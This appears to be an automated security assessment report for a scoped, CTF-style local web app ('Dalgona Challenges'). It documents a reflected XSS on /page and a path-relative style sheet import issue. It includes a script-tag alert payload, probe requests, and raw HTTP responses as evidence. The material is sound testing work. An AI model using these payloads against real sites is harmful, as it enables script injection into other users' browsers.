# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. MEDIUM — xss-reflected Reflected XSS via `name` parameter on /page](#finding-1)
    - [2. INFO — burp Path-relative style sheet import (2 URLs)](#finding-2)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqxdbxf2-0xgmvs` |
| Target | http://target.local:32784/ |
| Started | 2026-06-28T05:48:46.416Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 2 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32784`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

2 finding(s): 1 medium, 1 info

## Findings

<a id="finding-1"></a>

### 1. [MEDIUM] [xss-reflected] Reflected XSS via `name` parameter on /page

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32784/

The `/page` endpoint reflects the `name` query parameter directly into the HTML response without escaping. An attacker can craft a URL such as `/page?name=<script>…</script>` and deliver it to a victim; the script executes in the victim's browser under the application's origin. The root `/` page links directly to `/page`, providing the natural entry point.

**Reproduction**

```
1. Navigate to http://target.local:32784/page?name=<script>alert(1)</script>
2. Observe the `name` value reflected unescaped in the HTML response body.
3. In a browser, the script executes on page load.
```

**Evidence**

- Evidence `ev-mqxdesbc-7` — `artifacts/s-0001/ev-mqxdesbc-7/`

Request:

```http
GET /page?name=xssxZmqxdeqobb4er HTTP/1.1
Host: target.local:32784
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1003
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 05:50:59 GMT
server: Werkzeug/1.0.1 Python/2.7.18
x-xss-protection: 0


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss21.css">
            <title>Dalgona - Star</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_star.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=name placeholder="Enter your name..." > xssxZmqxdeqobb4er>
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqxdeu59-8` — `artifacts/s-0001/ev-mqxdeu59-8/`

Request:

```http
GET /page?name=%22%3E%3CxssxZmqxdeqobb4er%3E HTTP/1.1
Host: target.local:32784
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1007
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 05:51:01 GMT
server: Werkzeug/1.0.1 Python/2.7.18
x-xss-protection: 0


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss21.css">
            <title>Dalgona - Star</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_star.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=name placeholder="Enter your name..." > "><xssxZmqxdeqobb4er>>
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqxdew05-9` — `artifacts/s-0001/ev-mqxdew05-9/`

Request:

```http
GET /page?name=%22%3E%3CxssxZmqxdeqobb4er%3E HTTP/1.1
Host: target.local:32784
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1007
content-type: text/html; charset=utf-8
date: Sun, 28 Jun 2026 05:51:04 GMT
server: Werkzeug/1.0.1 Python/2.7.18
x-xss-protection: 0


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss21.css">
            <title>Dalgona - Star</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_star.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
                    <input type=text name=name placeholder="Enter your name..." > "><xssxZmqxdeqobb4er>>
                </form>
            </div>
        </div>
    </html>
```

<a id="finding-2"></a>

### 2. [INFO] [burp] Path-relative style sheet import (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this techniqu [+1 more URL(s): http://target.local:32784/page] @ http://target.local:32784/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqxdmdo7-p` — `artifacts/_/ev-mqxdmdo7-p/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32784

GET / HTTP/1.1
Host: target.local:32784
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1090
Server: Werkzeug/1.0.1 Python/2.7.18
Date: Sun, 28 Jun 2026 05:54:43 GMT


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```
